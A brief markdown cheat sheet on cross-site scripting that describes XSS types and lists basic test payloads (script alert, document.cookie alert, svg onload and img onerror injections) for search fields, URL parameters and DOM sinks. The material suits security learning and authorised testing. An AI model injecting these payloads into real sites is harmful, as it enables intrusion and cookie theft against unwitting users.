# Cross Site Scripting(XSS)

- To execute JavaScript payload on web applications with an intention to execute those without proper input validation by the web application

    ```
    <script>alert("hello")</script>
    ```

- **How to find XSS?**
    - At any search form or input form run following
        ```
        <script>alert("hello")</script>
        ```
        
    - Go for different parameters in url
    
# XSS types
- Reflected XSS - popup
- Stored XSS - popup
- DOM XSS
- Blind XSS - No popup

- Extracting cookie
    ```
    <script>alert(document.cookie)</script>
    ```
    
## DOM XSS in document.write sink using source location.search
- Use given below in search bar
```
"><svg onload=alert(1)>
```

## DOM XSS in innerHTML sink using source location.search
```
<img src=a onerror=alert(1)>
```